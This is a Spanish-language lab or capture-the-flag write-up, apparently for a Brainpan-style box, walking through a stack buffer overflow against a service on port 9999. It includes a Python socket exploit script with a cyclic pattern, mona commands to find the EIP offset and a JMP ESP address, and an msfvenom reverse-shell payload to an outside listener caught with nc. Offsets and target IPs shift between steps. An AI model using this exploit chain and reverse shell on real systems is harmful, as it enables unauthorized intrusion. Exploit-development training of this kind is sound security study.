Buffer overflow #

Fuzzeamos para ver la cantidad de bytes que admite.

Creamos un patrón con msf del tamaño de 600 bytes.

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

Lo aplicamos al script en la variable “payload”.

#!/usr/bin/python
import socket

ip = "10.0.3.9"
port = 9999

prefix = "brain "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

Con mona encontramos el offset del EIP.

!mona findmsp -distance 600
EIP contains normal pattern : 0x33724132 (offset 518)

Editamos el script.

offset = 518
retn "BBBB"

Como podemos ver el EIP ha cambiado su valor a “42424242” que es “BBBB”.

Buscamos los bad characters.

!mona bytearray -b "\x00"

ESP>FOLLOW IN DUMP, vemos que todos los carácteres están de forma correcta y no hay ninguno que sea “malo”, tan sólo usaremos el carácter “\x00” ya que es un null byte y en la mayoría de los casos no está admiitido.

Con mona llamamos a los módulos con la siguiente sintaxis:

!mona modules

Como podemos ver no tiene protecciones de memoria.

por lo tanto los aplicamos a la variable “retn” junto a los Nops (padding).

import socket
ip = "10.10.83.134"

port = 9999
timeout = 5
prefix = ""
offset = 524 # EIP
padding = "\x90" * 20 # No operation 
retn = "\xf3\x12\x17\x31" # JMP ESP

Creamos un payload y lo pegamos en su variable, nos ponemos en esucha con nc.

msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.37.230 LPORT=4444 EXITFUNC=thread -b "\x00" -f python

nc -lvnp 4444
